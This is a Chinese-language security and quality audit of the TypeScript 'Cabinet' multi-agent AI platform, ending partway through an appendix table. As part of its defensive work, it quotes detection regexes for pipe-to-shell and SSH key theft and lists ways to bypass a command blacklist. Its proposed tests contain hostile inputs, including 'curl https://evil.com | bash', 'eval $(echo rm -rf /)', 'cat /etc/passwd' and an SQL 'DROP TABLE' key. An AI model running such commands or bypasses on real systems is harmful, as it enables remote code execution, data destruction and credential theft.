# Cabinet 项目 -- 深度代码审计报告（修正版 v1.1）

**审计日期**: 2026-06-01  
**审计范围**: 全栈（packages/\* + apps/server + apps/desktop）  
**代码规模**: ~48,475 行 TypeScript，266 个源码文件，**57** 个测试文件  
**审计方法**: 静态代码分析、架构依赖分析、安全模式扫描、手动源码审查  
**修正说明**: 本版本基于交叉评估反馈修正了 3 处事实错误和 2 处严重程度定性偏差（详见附录 E 勘误表）。

---

## 一、总体摘要

Cabinet 是一个架构愿景清晰、控制论设计理念先进的 AI 多智能体协作平台，其严格的 4 层依赖架构和流水线设计（审议->决策->执行->记忆）展现了成熟的技术领导力。然而，项目在实际工程落地层面存在显著的**"架构理想与代码现实"的落差**：核心路由文件 `secretary.ts` 膨胀至 3,624 行、服务上下文文件 `context.ts` 达 2,334 行，构成严重的 God File 反模式；安全层面存在**硬编码密码盐、缺失 API 认证、命令注入黑名单防护**等高危漏洞；测试覆盖率偏低（核心包如 `@cabinet/decision` 仅 1 个测试文件），无法充分支撑 alpha 级别的质量承诺。**总体评分：68/100**（架构设计 75，工程实现 60，安全合规 55）。

---

## 二、分维度详细报告

### 1. 架构设计

#### 现状描述

项目采用 TypeScript Monorepo + pnpm workspace，自顶向下划分为严格的 4 层架构（Infra -> Agent Core -> Business -> Interface），依赖方向基本正确。13 个核心包与 2 个应用通过 `@cabinet/` scope 组织，barrel export 机制明确。控制论审计文档（`CYBERNETIC_AUDIT.md`）和架构检查工具（`tools/arch-lint.ts`）体现了架构治理意识。

#### 问题清单

**[高] God File 反模式：核心文件严重超标**

- **位置**: `apps/server/src/routes/secretary.ts` (3,624 行), `apps/server/src/context.ts` (2,334 行), `packages/agent/src/tools/index.ts` (1,200 行), `packages/agent/src/agent-loop.ts` (1,175 行)
- **影响**: 单一文件承担数十个职责（路由、文件操作、正则解析、向量计算、Agent 缓存、会议编排、Schema 定义等），导致理解成本极高、修改冲突率高、代码审查无法有效执行。`secretary.ts` 已接近小型框架的代码量。
- **证据**: `secretary.ts` 中定义了 `buildSystemPrompt`、`chunkText`、`cosineSimilarity`、`buildToolDependencies`、`getAgentLoopForRole`、`createReviewerLoop`、`persistReviewResult` 等 20+ 独立函数，跨越文件操作、数学计算、LLM 编排、路由处理等多个领域。

**[中] 类型系统信任度低，`any` 与 `as` 断言泛滥**

- **位置**: 全项目
- **影响**: 260 处 `any` 使用、649 处 `as` 类型断言，严重削弱了 TypeScript 的静态类型安全价值。尤其在 Agent 核心层（`agent-loop.ts`、`gateway`），类型断言掩盖了运行时类型不匹配的风险。
- **证据**: `grep -rn ": any\|as any"` 返回 260 条；`grep -rn " as "` 返回 649 条（过滤后仍超 500 处）。

**[低] 架构检查工具未有效执行模块行数上限**

- **位置**: `CABINET.md:58-60` 与 `tools/arch-lint.ts`
- **影响**: 规范声明"单个文件不超过 500 行"，但项目中存在 15 个超 500 行文件（5 个超 1000 行），说明行数检查未被纳入 CI 强制门禁或工具存在漏报。

#### 改进建议

1. **立即拆分 God File**：将 `secretary.ts` 按职责拆分为 `chat-handler.ts`、`meeting-orchestrator.ts`、`tool-deps-builder.ts`、`file-ops.ts` 等模块；将 `context.ts` 按基础设施初始化、服务工厂、状态管理拆分。
2. **类型硬化**：在 CI 中启用 `no-explicit-any` 规则（或降至 warning 并逐步修复），强制使用 `unknown` + 类型守卫替代 `as` 断言。
3. **将模块行数检查纳入 CI**：在 GitHub Actions 的 `ci.yml` 中增加文件行数门禁。

---

### 2. 功能设计

#### 现状描述

核心业务流程（TAOR Agent 循环、分级决策 L0-L3、多智能体会议、工作流引擎）均已实现，具有 checkpoint 恢复、上下文交接（ContextHandoff）、工具并行化、模型 fallback 等生产级特性。输入验证在主要 REST 路由中使用 Zod schema。

#### 问题清单

**[高] 认证中间件功能严重缺失：仅检查 Origin，无 Token 验证**

- **位置**: `apps/server/src/middleware/auth.ts`
- **影响**: 尽管 README 声明支持 `api_token` Bearer 认证，但 `authMiddleware` 仅验证请求来源是否为本地（localhost/Tauri），**完全不验证任何 Token**。这意味着任何能在本地运行的进程（包括恶意脚本、浏览器插件、其他应用）都可以无限制访问全部 API，包括执行 shell 命令、读取/写入文件、访问加密数据库。
- **证据**: `authMiddleware` 中仅 `isLocalOrigin()` 检查，无 token/PIN 验证。

**[高] WebSocket 事件总线完全开放，无认证机制**

- **位置**: `apps/server/src/ws/handler.ts`
- **影响**: WebSocket 连接仅通过 IP 地址判断（127.0.0.1 放行，其余拒绝）。与 HTTP 中间件一样，本地任何进程均可连接并接收所有广播事件（可能包含敏感决策、记忆内容、API key 使用记录）。
- **证据**: `wss.on('connection', (ws, req) => { ... if (clientKey === '127.0.0.1') ... })`。

**[中] FallbackChain 将"重试次数"与"模型链长度"混为一谈**

- **位置**: `packages/gateway/src/fallback.ts:35`
- **影响**: 循环条件 `i < models.length && i <= this.maxRetries` 意味着如果 `maxRetries=0`，即使配置了 3 个 fallback 模型也只能尝试第 1 个；如果 `maxRetries=10` 但仅 2 个模型，则第 2 个模型失败后不会重试。用户配置的 "maxRetries" 实际限制的是 "模型链索引"，而非语义上的重试次数。
- **证据**: `for (let i = 0; i < models.length && i <= this.maxRetries; i++)`。

**[中] CORS `allowHeaders` 与文档声明的 Bearer 认证矛盾**

- **位置**: `apps/server/src/index.ts:55`
- **影响**: `allowHeaders` 仅暴露 `Content-Type` 和 `x-cabinet-pin`，未包含 `Authorization`。若客户端按 README 使用 `Authorization: Bearer <token>`，预检请求（OPTIONS）将被浏览器 CORS 策略阻止。
- **证据**: `allowHeaders: ['Content-Type', 'x-cabinet-pin']`。

**[中] 自定义 `.env` 解析器不支持引号、转义和换行值**

- **位置**: `apps/server/src/config.ts`
- **影响**: 手动按 `=` 分割的解析逻辑无法处理带等号的值、引号包裹的值、或 `#` 注释后的值，可能导致 API key 被错误截断或包含多余字符。
- **证据**: `const value = trimmed.slice(eqIdx + 1).trim();` -- 无引号剥离、无转义处理。

**[低] 速率限制器使用内存 Map，进程重启即失效，存在内存泄漏风险**

- **位置**: `apps/server/src/middleware/rate-limit.ts:9`
- **影响**: 内存中的 `Map<string, RateLimitEntry>` 无大小上限。在面向公网的部署场景下，攻击者可通过大量不同 IP（如 IPv6 地址空间扫描）使 Map 无限增长，导致 OOM。且进程重启后所有限制记录丢失。
- **证据**: `const store = new Map<string, RateLimitEntry>();`。

#### 改进建议

1. **立即实现 API Token 认证**：在 `authMiddleware` 中增加 `Authorization: Bearer <token>` 或 `x-cabinet-api-key` 校验，与 `settings` 表中存储的 API key 比对。WebSocket 连接时要求 URL 查询参数携带 token。
2. **分离 FallbackChain 的重试逻辑**：引入双重循环——外层遍历模型链，内层按 `maxRetries` 对同一模型重试（指数退避）。
3. **替换自定义 env 解析**：使用 `dotenv` 或 `dotenv-expand` 标准库。
4. **速率限制器持久化**：使用 Redis 或 SQLite 存储限速计数，支持多实例部署；增加 IP 白名单/黑名单机制。

---

### 3. 代码质量

#### 现状描述

代码风格整体一致，使用 TypeScript `strict` 模式，采用了较新的语言特性（如 `satisfies`、顶层 await）。项目规范（`CABINET.md`）对命名、注释、模块导出有明确要求。空 catch 块极少（未发现），TODO/FIXME 仅 1 处，表明维护状态良好。

#### 问题清单

**[高] 超级路由文件 `secretary.ts` 职责极度混乱**

- **位置**: `apps/server/src/routes/secretary.ts`
- **影响**: 一个文件内混合了 HTTP 路由处理器、文件系统操作、正则表达式工厂、文本分块算法、余弦相似度计算、shell 命令危险检测、环境变量过滤、LSP 符号查询、子 Agent 生命周期管理、缓存 LRU 逻辑等。这不仅是行数问题，更是**单一职责原则的严重违反**——任何一处修改都可能影响不相关的功能。
- **证据**: 文件中定义了 `globToRegex`、`safeRegex`、`isInternalIP`、`extractTitle`、`chunkText`、`cosineSimilarity`、`detectDangerousCommand`、`buildSafeEnv` 等完全不属于路由层的底层工具函数。

**[中] 工具函数散落各处，未统一收拢到 utils/tooling 包**

- **位置**: `apps/server/src/routes/secretary.ts`、`apps/server/src/capabilities.ts` 等
- **影响**: `chunkText`、`cosineSimilarity`、`detectDangerousCommand`、`buildSafeEnv` 等通用算法在不同文件中重复定义或交叉引用，导致 DRY 原则被破坏，修改时难以找到所有引用点。
- **证据**: `chunkText` 仅在 `secretary.ts` 中定义，但文本分块是通用记忆/知识库功能；`buildSafeEnv` 在 `capabilities.ts` 中定义但 `secretary.ts` 也操作环境变量。

**[中] `as` 类型断言在存储层大量使用，掩盖数据库类型风险**

- **位置**: `packages/storage/src/repositories/*.ts`
- **影响**: Repository 层将 `better-sqlite3` 返回的 `Record<string, unknown>` 大量断言为具体类型，若数据库 schema 与代码类型定义不同步（如迁移遗漏），将在运行时抛出不可预期的类型错误。
- **证据**: `agent-role-repo.ts:131-138` 连续使用 `row.type as string`、`row.name as string` 等；`decision.ts`、`employee-repo.ts` 同理。

**[低] `agent-loop.ts` 的 `StreamingCallback` 接口过度膨胀**

- **位置**: `packages/agent/src/agent-loop.ts:42-62`
- **影响**: 一个接口定义了 20 个回调方法，导致接口使用方必须了解大量不相关的回调，且每次新增事件都需修改接口定义，违反了接口隔离原则。
- **证据**: `export interface StreamingCallback { ... 20+ methods ... }`。

**[低] `config.ts` 在模块顶层执行副作用（进程退出）**

- **位置**: `apps/server/src/config.ts`
- **影响**: `envSchema.safeParse(process.env)` 在模块加载时执行，若环境变量验证失败直接调用 `process.exit(1)`。这在测试环境中极不友好——导入该模块的任何测试都会因环境变量缺失而直接终止进程，无法通过 mock 或配置覆盖来恢复。
- **证据**: `if (!result.success) { ... process.exit(1); }` 位于模块顶层。

#### 改进建议

1. **按垂直切片拆分 `secretary.ts`**：将非路由函数迁移到 `packages/agent` 或 `apps/server/src/services/`、`apps/server/src/utils/` 中；路由文件只保留 HTTP 层转换逻辑。
2. **Repository 层引入运行时类型校验**：使用 Zod 或 `valibot` 对数据库查询结果进行 `safeParse`，失败时记录 error 并返回 default value，而非直接 `as` 断言。
3. **将 StreamingCallback 重构为事件总线模式**：使用 `EventEmitter` 或 `@cabinet/events` 发布 `AgentStreamEvent` 联合类型，消费者通过 `on('toolCall', handler)` 订阅，避免接口膨胀。
4. **延迟 config 验证**：将 `process.exit` 改为抛出自定义错误 `ConfigValidationError`，由 `main.ts` 的启动流程捕获并决定是否退出；测试环境可通过临时设置环境变量绕过。

---

### 4. 安全性

#### 现状描述

项目在密码学层面有正确的设计意识：API key 使用 AES-256-GCM 加密、PIN 使用 scrypt 哈希、数据库启用 WAL 和 busy timeout。存在危险命令黑名单检测和 `buildSafeEnv` 环境变量过滤机制。值得肯定的是，项目已实施了部分缓解措施：**`timingSafeEqual` 防止时序攻击**、`needsRehash` 支持从 SHA-256 到 scrypt 的平滑迁移路径、`fieldMap` 白名单保护动态 SQL 列名。

#### 已做对的缓解措施（报告平衡性补充）

- **防时序攻击**：`verifyPin` 使用 `timingSafeEqual` 而非普通字符串比较，防止 PIN 校验被时序分析破解（`auth-utils.ts:28, 38`）。
- **密码哈希迁移路径**：`verifyPin` 返回 `needsRehash` 标志，支持将旧版 SHA-256 哈希自动迁移到 scrypt（`auth-utils.ts:23, 39`）。
- **SQL 列名白名单**：`agent-role-repo.ts` 的 `UPDATE` 动态拼接由硬编码 `fieldMap` 控制，当前代码中用户输入无法直接控制列名（`agent-role-repo.ts:98-112`）。
- **AES-256-GCM 正确实现**：`crypto.ts` 使用随机 IV、随机 salt、scrypt 密钥派生，密文格式为 `salt + iv + tag + ciphertext`（`crypto.ts:21-33`）。

#### 问题清单

**[高] PIN 哈希使用全局硬编码盐值，彻底破坏 scrypt 的防彩虹表能力**

- **位置**: `apps/server/src/auth-utils.ts:5`
- **影响**: `const SALT = 'cabinet-salt'` 被硬编码在所有实例中。scrypt 的设计目标之一是通过随机盐值使相同密码产生不同哈希；全局硬编码盐值意味着所有用户的 PIN 哈希在泄露后可通过一次预计算攻击批量破解。
- **证据**: `return 'scrypt:' + scryptSync(pin, SALT, KEYLEN).toString('hex');` -- 所有部署实例共享同一盐值。

**[高] `execCommand` 工具使用黑名单过滤用户命令，存在命令注入绕过风险**

- **位置**: `apps/server/src/capabilities.ts:784-801`、`apps/server/src/routes/secretary.ts:311-322`
- **影响**: `detectDangerousCommand` 仅通过正则表达式匹配已知危险模式（`rm -rf /`、`dd if=`、fork bomb 等）。这种黑名单模式**极易绕过**：例如 `rm -rf /*` 绕过 `/` 检查；`cat /etc/passwd` 不在黑名单中；通过编码、换行、反引号、变量展开等方式可构造大量绕过案例。更危险的是，`execAsync` 默认使用 `/bin/bash` 执行，攻击者可通过 `bash -c '...'` 注入任意命令。
- **证据**: `shell: process.platform === 'win32' ? ... : '/bin/bash'`；黑名单仅覆盖 6-12 种模式。

**[高] 认证层完全失效：Origin 检查不能替代身份验证**

- **位置**: `apps/server/src/middleware/auth.ts`、`apps/server/src/ws/handler.ts`
- **影响**: 本地任何进程（包括网页中的 JavaScript 通过 `fetch('http://localhost:3000/...')`）均可访问 API。在 Tauri 桌面应用中，前端页面即使加载远程内容，也可通过 `localhost` 请求后端，形成**本地特权提升漏洞**。
- **证据**: `authMiddleware` 和 `ws/handler.ts` 均只检查 origin/IP，无 token 验证。

**[中] `detectDangerousCommand` 在两个文件中以不同强度实现，安全策略分裂**

- **位置**: `apps/server/src/capabilities.ts:269-300`、`apps/server/src/routes/secretary.ts:311-322`
- **影响**: `capabilities.ts` 版本包含 12 条规则（覆盖 pipe-to-shell、encoded powershell、SSH key exfil 等），而 `secretary.ts` 版本仅 7 条基础规则。这导致**不同调用路径的安全策略强度不同**：通过 `capabilities.ts` 调用的 execCommand 受更严格保护，而通过 `secretary.ts` 调用的路径却缺少 pipe-to-shell 检测等关键规则。
- **证据**: `capabilities.ts` 有 `/(curl|wget|fetch).*\|.*(sh|bash|zsh|fish)/` 和 `/\bcat\b.*(id_rsa|id_ed25519|id_ecdsa)/` 等规则，`secretary.ts` 版本完全缺失。

**[低] SQL UPDATE 动态列名拼接（当前受白名单保护，但设计债务）**

- **位置**: `packages/storage/src/repositories/agent-role-repo.ts:117`、`packages/storage/src/repositories/decision.ts:131`、`packages/storage/src/repositories/employee-repo.ts:78`
- **影响**: 当前代码通过硬编码 `fieldMap` 白名单控制列名，**在当前版本中不是可利用的注入漏洞**。但这种模式违反了"参数化查询应覆盖所有动态部分"的安全原则：若未来代码修改允许外部传入 `changes` 对象的 key，将直接形成 SQL 注入。
- **证据**: ``.prepare(`UPDATE agent_roles SET ${sets.join(', ')} WHERE name = ? AND is_builtin = 0`)`` -- 列名来自 `fieldMap` 而非用户输入，但 `fieldMap` 与 SQL 拼接的耦合是设计债务。

**[中] API Provider Key 明文驻留内存**

- **位置**: `apps/server/src/config.ts`
- **影响**: `anthropicApiKey`、`openaiApiKey` 等从环境变量直接加载到内存中的纯文本 config 对象。若进程崩溃产生 core dump、或被 attach debugger，密钥将以明文暴露。虽然本地场景风险可控，但不符合密钥管理最佳实践。
- **证据**: `anthropicApiKey: parsedEnv.ANTHROPIC_API_KEY`（未加密）。

**[中] `scryptSync` 同步执行阻塞事件循环**

- **位置**: `apps/server/src/auth-utils.ts:10`
- **影响**: scrypt 是计算密集型操作（设计目标就是慢）。在 Node.js 单线程事件循环中同步执行，将导致期间所有并发请求（HTTP、WebSocket、Agent 循环）被冻结。若被恶意利用（如大量 `/api/auth/verify` 请求），可造成 DoS。
- **证据**: `return 'scrypt:' + scryptSync(pin, SALT, KEYLEN).toString('hex');`。

**[低] 默认主密码 `change-me` 未强制修改提示**

- **位置**: `README.md`、`README_CN.md`
- **影响**: 文档中 `CABINET_MASTER_PASSWORD` 的默认值是 `change-me`，且未在启动日志中强烈警告用户修改。开发环境自动生成的随机 key 虽较安全，但生产环境若用户未设置则直接崩溃（有检查），体验不友好。

**[低] 日志中可能包含敏感内容**

- **位置**: `packages/agent/src/agent-loop.ts`
- **影响**: Agent 循环将 tool call 的 arguments 和 result 直接序列化到 `handoffText` 和 `msgText` 中，若工具操作涉及文件内容、API key、数据库记录，可能通过日志或 checkpoint 持久化到磁盘。
- **证据**: `const msgText = \`Tool result for ${tc.name}: ${errorLabel}${JSON.stringify(result.error ?? result.output)}\`;`。

#### 改进建议

1. **紧急修复盐值**：使用 `randomBytes(16)` 为每个 PIN 生成独立盐值，存储格式改为 `scrypt:<salt>:<hash>`；提供现有哈希的自动迁移路径。
2. **重构 execCommand 安全模型**：
   - 短期：将 `shell: '/bin/bash'` 改为 `shell: false`，强制使用参数化执行（`spawn(command, args, { shell: false })`），拒绝任何包含 shell 元字符（`;`、`|`、`&`、`$()`、`\``）的命令。
   - 长期：建立允许列表（allowlist），仅预定义一组安全命令模板（如 `git clone <url>`、`npm install`），其余全部拒绝。
   - 立即：统一 `detectDangerousCommand` 两个版本的规则集，以 `capabilities.ts` 的完整版本为基准，删除 `secretary.ts` 中的弱化版本。
3. **实施分层认证**：
   - HTTP：强制 `Authorization: Bearer <token>`，token 存储在 `settings` 表中（bcrypt 哈希）。
   - WebSocket：连接时校验 `?token=<token>`。
   - 敏感操作（如 `execCommand`、文件写入）增加二次 PIN 确认。
4. **SQL 动态列加固**：当前 `fieldMap` 提供保护，但建议未来改为静态分支（`if (changes.name) { stmt = db.prepare('UPDATE ... SET name = ?') }`）或使用列名白名单 + 严格的 key 校验。
5. **密钥内存保护**：使用 `Buffer` 并在使用后 `fill(0)` 清零；或考虑使用 OS keychain（`keytar`）存储 provider key。
6. **异步密码学**：将 `scryptSync` 替换为 `scrypt`（回调/Promise 版本）并在 Worker Thread 中执行。

---

### 5. 性能

#### 现状描述

数据库使用 SQLite WAL 模式（`journal_mode = WAL`、`synchronous = NORMAL`），支持并发读写。Agent 循环实现了工具并行化（只读工具并发执行）。Gateway 具备模型路由和 30 秒超时控制。ContextMonitor 通过 token 预估实现上下文分区和交接。

#### 问题清单

**[中] 数据库连接为全局单例，无连接池，不支持并发写扩展**

- **位置**: `packages/storage/src/connection.ts`
- **影响**: `createConnection` 返回单例 `db`。SQLite 在 WAL 模式下支持多读取并发，但写入仍串行化。单连接模式下，如果一个长时间运行的 Agent 工具持有数据库事务，其他请求将被阻塞。未来多用户/多 Agent 并发场景下会成为瓶颈。
- **证据**: `let db: Database.Database | null = null;` 模块级变量，任何导入 `@cabinet/storage` 的代码共享同一连接。

**[中] HNSW 向量索引全内存加载，无持久化或分段策略**

- **位置**: `packages/memory/src/long-term.ts`（依赖 `hnswlib-node`）
- **影响**: `hnswlib-node` 的索引在 Node.js 进程中完全驻留内存。随着长期记忆数据增长，RSS 内存将线性膨胀。项目未实现索引分片、压缩或 LRU 卸载策略。
- **证据**: 依赖 `hnswlib-node:^3.0.0`，该库默认内存存储。

**[中] 速率限制器 Map 无上限，高并发下内存膨胀**

- **位置**: `apps/server/src/middleware/rate-limit.ts:9`
- **影响**: 每个不同 IP 在 Map 中创建一个 entry，且无最大容量限制。在公网部署或 IPv6 扫描攻击下，Map 可能消耗数百 MB 内存。
- **证据**: `const store = new Map<string, RateLimitEntry>();` 无 `maxSize` 或 LRU 淘汰。

**[低] `agent-loop.ts` 中 JSON.stringify 用于工具结果去重，性能差且不稳定**

- **位置**: `packages/agent/src/agent-loop.ts:708-709`
- **影响**: `JSON.stringify(prev.args) === JSON.stringify(tc.arguments)` 用于判断工具调用是否已执行。对于大参数对象或包含循环引用的对象，这不仅是 O(n) 的序列化开销，还可能直接抛异常导致 Agent 崩溃。
- **证据**: `JSON.stringify(prev.args) === JSON.stringify(tc.arguments)`。

**[低] 上下文交接（ContextHandoff）可能产生大量大文本持久化**

- **位置**: `packages/agent/src/context-handoff.ts`
- **影响**: 当上下文进入 Critical/Dumb zone 时，系统将整个对话历史、工具结果、记忆内容压缩为 handoff 文档并写入 SQLite。对于长会话（数百轮），每次 handoff 可能写入数 MB 数据，产生磁盘 I/O 热点。

#### 改进建议

1. **连接池化**：对读取操作使用只读连接池（`better-sqlite3` 支持多连接），写入操作使用单一队列化连接。
2. **向量索引持久化**：定期将 HNSW 索引 `writeIndex` 到磁盘，并在内存中维护活跃分片；或评估迁移到 `sqlite-vec` 等 SQLite 原生向量扩展。
3. **速率限制器 LRU 化**：使用 `lru-cache` 限制 Map 大小为 10,000 entries，超限时淘汰最旧条目。
4. **工具去重优化**：使用稳定哈希（如 `object-hash` 的 sha256）替代 `JSON.stringify` 全字符串比较。
5. **Handoff 压缩与分层**：对历史消息进行摘要化（summarization）后再持久化，保留完整历史的引用 ID 而非全文。

---

### 6. 可维护性与可测试性

#### 现状描述

项目使用 Vitest 作为测试框架，GitHub Actions CI 已配置。存在架构检查工具（`lint:arch`）和格式化工具（Prettier、ESLint）。控制论审计报告体现了系统的自反思能力。

#### 问题清单

**[高] 测试覆盖率偏低，核心包测试不足**

- **位置**: 全项目
- **影响**: 266 个源码文件对应 **57** 个测试文件，覆盖率约 21%。多个核心业务包仅有 0-1 个测试文件：`@cabinet/cli` (0)、`@cabinet/decision` (1)、`@cabinet/harness` (1)、`@cabinet/meeting` (1)、`@cabinet/secretary` (1)。`apps/server`（15,207 行）仅 6 个测试文件。这意味着绝大多数边界条件、错误路径、状态转换完全未经自动化验证。
- **证据**: `find packages apps -name '*.test.ts' -o -name '*.test.tsx'` 返回 57 个文件。

**[高] God File 导致单元测试几乎不可行**

- **位置**: `apps/server/src/routes/secretary.ts`、`apps/server/src/context.ts`
- **影响**: 3,624 行的路由文件依赖了 20+ 外部模块和大量闭包状态（`activeSubAgents`、`routeFeedbackStore`、`agentLoopCache` 等）。要为其中任何一个函数写单元测试，都需要 mock 整个 Cabinet 生态，测试成本极高，这解释了为什么测试如此稀少。

**[中] 模块顶层副作用导致测试隔离困难**

- **位置**: `apps/server/src/config.ts`（`process.exit`）、`packages/storage/src/connection.ts`（全局单例 db）
- **影响**: 导入 `config.ts` 可能终止进程；导入 `storage` 会触发全局数据库连接。这使得并行测试、内存数据库替换、环境变量 mock 变得异常困难。

**[中] 业务逻辑与 HTTP 层未分离，E2E 测试成为唯一选择**

- **位置**: `apps/server/src/routes/*.ts`
- **影响**: 大量业务逻辑直接写在 Hono 路由处理器中（如 `secretary.ts` 中的会议编排、Agent 调度），没有独立的 Service 层。这迫使测试必须走 HTTP 层（E2E），而 E2E 测试又需要完整的 LLM、数据库、文件系统环境，进一步降低了测试意愿。

**[低] 部分测试文件行数超标**

- **位置**: `packages/agent/src/tools/__tests__/tools.test.ts` (533 行)
- **影响**: 该文件行数达 533 行，本身也接近超标，说明测试也未被有效拆分。

#### 改进建议

1. **测试优先策略**：为核心包（`decision`、`workflow`、`agent`）设定最低覆盖率门槛（行覆盖率 70%，分支覆盖率 60%），纳入 CI 强制检查。
2. **引入 Service 层**：在 `apps/server/src/services/` 中建立纯函数/类形式的业务服务（如 `MeetingService`、`AgentOrchestrator`），路由层仅负责 HTTP 转换。这样可用内存数据库 + mock LLM 网关进行快速单元测试。
3. **测试基础设施**：提供 `createTestContext()` 工厂函数，自动创建内存 SQLite + mock gateway + stub eventBus，降低测试编写成本。
4. **消除模块级副作用**：将全局单例改为可注入的依赖（如 `class StorageFactory { createConnection() }`），测试时传入 `:memory:` 数据库。
5. **集成测试覆盖关键路径**：为 `agent-loop.ts` 的 TAOR 循环、决策状态机、工作流引擎编写集成测试，使用 fake LLM（预定义响应）代替真实 API 调用。

---

### 7. 文档与规范

#### 现状描述

README（中英双语）详尽阐述了产品愿景、架构分层、API 使用、部署方式。`CABINET.md` 作为项目操作手册明确了构建命令、架构约束、技术栈、TypeScript 配置和代码约定。`CYBERNETIC_AUDIT.md` 提供了高价值的控制论框架自审计，成熟度评分 6.6/10，包含 P0-P3 修复路线图。

#### 问题清单

**[中] README 中声明的 API Token 认证与代码实现严重不符**

- **位置**: `README.md:222-227` vs `apps/server/src/middleware/auth.ts`
- **影响**: 文档告诉用户 "When `api_token` is configured, all endpoints require a Bearer token"，但实际代码完全不检查 token。这会导致用户产生虚假安全感，在公网部署时暴露服务。
- **证据**: README 中有 curl Bearer token 示例；authMiddleware 中无 token 解析逻辑。

**[中] 环境变量文档不完整，缺少安全相关变量**

- **位置**: `README.md` 环境变量表格
- **影响**: 文档未列出 `CABINET_DAILY_BUDGET`、`CABINET_WEEKLY_BUDGET`、`CABINET_MONTHLY_BUDGET` 等实际支持的变量，也未说明 `.env` 文件支持（`config.ts` 实现了 `.env` 加载但文档未提及）。

**[低] `CABINET.md` 中模块行数上限规范未被执行**

- **位置**: `CABINET.md:58-60`
- **影响**: 规范声明"超过 800 行必须拆分"，但项目存在 2 个超 2000 行、5 个超 1000 行文件。若规范不被工具强制执行，则形同虚设。

**[低] 代码提交规范（commitlint）配置存在但可能未充分利用**

- **位置**: `package.json` 中 `commitlint` 配置
- **影响**: 虽然配置了 `@commitlint/config-conventional`，但未在 `package.json` scripts 中看到 `husky` 或 `lint-staged` 配置，提交规范依赖开发者自觉，难以保证一致性。

#### 改进建议

1. **立即修复文档与代码的一致性**：要么实现 Bearer token 认证，要么从 README 中删除相关描述并明确声明"当前版本仅支持本地访问，不提供远程认证"。
2. **补全环境变量文档**：列出 `config.ts` 中解析的全部变量及其安全含义。
3. **强化规范执行**：在 CI 中添加模块行数检查（如 `find ... -exec wc -l ... | awk '$1 > 500'`），失败则阻断合并。
4. **增加架构决策记录（ADR）**：为 4 层架构、TAOR 循环、Human Node 等关键设计创建 `docs/architecture/adr-*.md`，帮助新开发者理解设计动机。

---

## 三、风险收敛建议与优先级

### Top 5 最需立即修复的问题

| 优先级 | 问题                                      | 风险等级                 | 修复工时估算 | 关键动作                                                                  |
| ------ | ----------------------------------------- | ------------------------ | ------------ | ------------------------------------------------------------------------- |
| P0     | **硬编码 scrypt 盐值**                    | 严重安全漏洞             | 2h           | 使用随机盐值，迁移现有哈希格式                                            |
| P0     | **认证层完全缺失**                        | 本地特权提升、未授权访问 | 4h           | 实现 Bearer/API Key 中间件，覆盖 HTTP + WebSocket                         |
| P0     | **`execCommand` 命令注入**                | RCE 远程代码执行         | 4h           | 禁用 shell 执行，改为参数化 `spawn`；统一 `detectDangerousCommand` 规则集 |
| P1     | **God File 拆分**                         | 维护成本极高、测试不可行 | 16h          | 按职责垂直拆分，提取 Service 层和工具函数                                 |
| P1     | **`detectDangerousCommand` 安全策略分裂** | 不同调用路径防护强度不同 | 2h           | 以 `capabilities.ts` 完整版本为基准，删除 `secretary.ts` 中的弱化版本     |

### 短期优化路线图（1-2 周）

1. **安全加固（Week 1）**
   - 修复硬编码盐值 + 认证缺失 + 命令注入（P0 三项）
   - 统一 `detectDangerousCommand` 两个版本的规则集
   - 将 `scryptSync` 移至 Worker Thread
   - CORS `allowHeaders` 补充 `Authorization`

2. **架构修复（Week 1-2）**
   - 拆分 `secretary.ts` 的工具函数到 `services/` 和 `utils/`
   - 拆分 `context.ts` 的初始化逻辑到 `factories/`

3. **测试补足（Week 2）**
   - 为核心包（`decision`、`workflow`、`events`）补充单元测试，目标行覆盖 60%
   - 建立 `createTestContext()` 测试工厂

### 长期优化路线图（1-3 月）

1. **类型系统硬化**：逐步消除 `any` 和 `as` 断言，启用 `no-explicit-any` ESLint 规则
2. **性能优化**：引入 SQLite 连接池、HNSW 索引磁盘持久化、向量索引分片
3. **测试体系完善**：核心业务包达到 80% 行覆盖率，引入契约测试（Pact）验证 desktop->server API 兼容性
4. **多实例部署支持**：将内存状态（rate limiter、缓存、activeSubAgents）外迁到 Redis 或 SQLite 共享存储
5. **安全审计自动化**：引入 `semgrep`、`npm audit`、`trivy` 到 CI 流水线

---

## 四、附录

### A. 推荐工具

| 用途         | 工具                                        | 说明                                   |
| ------------ | ------------------------------------------- | -------------------------------------- |
| 静态安全分析 | `semgrep` + `eslint-plugin-security`        | 扫描命令注入、硬编码密钥、SQL 注入模式 |
| 依赖漏洞扫描 | `npm audit`、`trivy`                        | 检测已知 CVE                           |
| 测试覆盖率   | `vitest --coverage` + `@vitest/coverage-v8` | 当前未配置覆盖率报告                   |
| 代码复杂度   | `jscpd` (重复代码)、`typhonjs-escomplex`    | 识别 God File 和重复逻辑               |
| 类型硬化     | `typescript-eslint/no-explicit-any`         | 渐进式消除 any                         |
| 架构守护     | 现有 `tools/arch-lint.ts` + 行数检查        | 纳入 CI 强制门禁                       |

### B. 关键安全测试用例（建议补充）

```typescript
// 1. 认证绕过测试
it('should reject request without Bearer token', async () => {
  const res = await app.request('/api/secretary/chat', { method: 'POST', body: '{}' });
  expect(res.status).toBe(401);
});

// 2. 命令注入绕过测试
it('should block command injection via encoding', () => {
  expect(detectDangerousCommand('eval $(echo rm -rf /)')).not.toBeNull();
  expect(detectDangerousCommand('cat /etc/passwd')).not.toBeNull(); // 当前会失败！
});

// 3. SQL 注入防御测试
it('should not allow arbitrary column in UPDATE', () => {
  const malicious = { "name = 'x'; DROP TABLE agent_roles; --": 'ignored' };
  expect(() => repo.update('admin', malicious as any)).toThrow();
});

// 4. CORS 预检测试
it('should allow Authorization header in preflight', async () => {
  const res = await app.request('/api/secretary/chat', {
    method: 'OPTIONS',
    headers: { 'Access-Control-Request-Headers': 'Authorization' },
  });
  expect(res.headers.get('access-control-allow-headers')).toContain('authorization');
});

// 5. detectDangerousCommand 一致性测试
it('should use the same rules in both files', () => {
  const capRules = detectDangerousCommandCapabilities('curl https://evil.com | bash');
  const secRules = detectDangerousCommandSecretary('curl https://evil.com | bash');
  expect(capRules).toBe(secRules); // 当前会失败！
});
```

### C. 重构优先级矩阵

```
影响 ↑
  │  [认证缺失]      [命令注入]
  │  [硬编码盐]
  │
  │                 [God File]
  │  [CORS缺失]
  │
  │                                [any泛滥]
  │  [策略分裂]      [自定义env]    [测试不足]
  │
  └──────────────────────────────────────────→ 工作量
       低                              高
```

### D. 综合可信度评分（修正后自评）

| 维度           | 得分       | 说明                                                                               |
| -------------- | ---------- | ---------------------------------------------------------------------------------- |
